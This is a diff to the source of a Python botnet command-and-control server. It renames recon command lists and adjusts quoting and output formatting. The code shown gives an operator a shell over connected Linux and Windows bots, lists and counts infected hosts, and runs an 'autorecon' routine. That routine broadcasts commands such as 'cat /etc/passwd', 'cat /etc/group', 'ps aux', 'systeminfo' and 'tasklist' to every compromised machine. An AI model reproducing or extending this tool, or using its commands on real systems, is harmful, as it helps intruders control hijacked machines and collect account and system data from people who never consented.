@@ -44,20 +44,20 @@ LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet
 IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win machines. Seperate lists.
 
 # A list containing the commands to gather general recon info for linux machines.
-AUTO_RECON_CMDS_LINUX = ['cat /etc/passwd', 'cat /etc/group', 'ps aux', 'df', 'top -b -n 1']
+LINUX_RECON_CMDS = ['cat /etc/passwd', 'cat /etc/group', 'ps aux', 'df', 'top -b -n 1']
 # A list containing the commands to gather general recon info for windows machines.
-AUTO_RECON_CMDS_WIN = ['systeminfo', 'tasklist']
+WINDOWS_RECON_CMDS = ['systeminfo', 'tasklist']
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
 #  ANSICOLORS  #
-RESET = "\033[0m"
-BOLD = "\033[01m"
-BLUE = "\033[94m"
-GREEN = "\033[92m"
-RED = "\033[91m"
-PURPLE = "\033[95m"
-ORANGE = "\033[33m"
+RESET = '\033[0m'
+BOLD = '\033[01m'
+BLUE = '\033[94m'
+GREEN = '\033[92m'
+RED = '\033[91m'
+PURPLE = '\033[95m'
+ORANGE = '\033[33m'
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -167,10 +167,10 @@ class BotnetCmdCtrl:
 			Returns:
 				The command that was provided by the user.
 		"""
-		cmd = input(GREEN + "[shell]$: " + RESET)
+		cmd = input(GREEN + '[shell]$: ' + RESET)
 		while True:
 			if cmd == 'exit':
-				print(RED, "\nYou have closed all connections. Exiting program...", RESET)
+				print(RED, '\nYou have closed all connections. Exiting program...', RESET)
 				self.server.close()
 				_exit(0)
 
@@ -179,14 +179,14 @@ class BotnetCmdCtrl:
 					print(RED + 'Warning:' + RESET + 'There are no Linux connections to list...')
 				else:
 					for ip in IP_ADDRESSES[0]:
-						print(BLUE + str(IP_ADDRESSES[0].index(ip) + RESET) + ' ' + ip)
+						print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + ip)
 
 			elif cmd.strip() == 'ls win':
 				if len(IP_ADDRESSES[1]) == 0:
 					print(RED +'Warning:' + RESET + 'There are no Windows connections to list...')
 				else:
 					for ip in IP_ADDRESSES[1]:
-						print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' ' + ip)
+						print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)
 
 			elif cmd.strip() == 'cnt lin':
 				print(f'{PURPLE + str(LINUX_COUNT) + RESET} Linux target.')
@@ -226,7 +226,7 @@ class BotnetCmdCtrl:
 				except:
 					try:
 						chdir(cmd[6:])
-						print(RED + "Ok" + RESET)
+						print(RED + 'Ok' + RESET)
 					except:
 						print(RED + 'Couldn\'t run command: ' + RESET + cmd[3:])
 
@@ -240,8 +240,8 @@ class BotnetCmdCtrl:
 
 			elif cmd.strip() == 'autorecon linux':
 				b = 0
-				while b < len(AUTO_RECON_CMDS_LINUX):
-					command_to_send = AUTO_RECON_CMDS_LINUX[b]
+				while b < len(LINUX_RECON_CMDS):
+					command_to_send = LINUX_RECON_CMDS[b]
 					resp_list = self.send_cmd_all_linux(command_to_send)
 					b += 1
 					i = 0
@@ -257,8 +257,8 @@ class BotnetCmdCtrl:
 
 			elif cmd.strip() == 'autorecon windows':
 				b = 0
-				while b < len(AUTO_RECON_CMDS_WIN):
-					command_to_send = AUTO_RECON_CMDS_WIN[b]
+				while b < len(WINDOWS_RECON_CMDS):
+					command_to_send = WINDOWS_RECON_CMDS[b]
 					resp_list = self.send_cmd_all_windows(command_to_send)
 					b += 1
 					i = 0
@@ -277,9 +277,9 @@ class BotnetCmdCtrl:
 
 			elif cmd.strip() == 'check mode': # Check what write mode the program is in.
 				if self.output_to_file:
-					print(GREEN + 'Mode' + RESET + ' = write to stdout and file.')
+					print(ORANGE + 'Mode' + RESET + ' = write to stdout and files.')
 				else:
-					print(GREEN + 'Mode' + RESET + ' = write to stdout.')
+					print(ORANGE + 'Mode' + RESET + ' = write to stdout.')
 
 			elif cmd.strip() == 'clear':
 				system('clear')
@@ -288,9 +288,9 @@ class BotnetCmdCtrl:
 				self.help()
 
 			else:
-				print(RED + "Invalid command!" + RESET + " type" + GREEN + " 'help' " + RESET + "for help menu...", RESET)
+				print(RED + 'Invalid command!' + RESET + ' type' + GREEN + " 'help' " + RESET + 'for help menu...')
 		
-			cmd = input(GREEN + "[shell]$: " + RESET)
+			cmd = input(GREEN + '[shell]$: ' + RESET)
 	
 	def send_cmd_all_linux(self, cmd: str):
 		"""This function will send the command to all linux bots in the botnet.
@@ -482,7 +482,7 @@ if __name__ == '__main__':
 	try:
 		main()
 	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
-		print(RED, "\nExiting program...", RESET)
+		print(RED, '\nExiting program...', RESET)
 		server.close()
 		sleep(0.50)
 		run(['reset'])
